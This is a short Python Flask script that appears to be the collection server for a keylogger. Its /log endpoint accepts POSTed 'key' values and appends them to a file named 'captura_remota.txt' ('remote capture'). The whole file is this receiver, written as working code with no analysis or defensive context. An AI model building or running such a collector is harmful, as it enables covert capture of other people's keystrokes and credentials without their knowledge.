from flask import Flask, request

app = Flask(__name__)

@app.route('/log', methods=['POST'])
def log_key():
    key = request.form.get("key")
    with open("captura_remota.txt", "a") as f:
        f.write(key)
    return "OK"

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
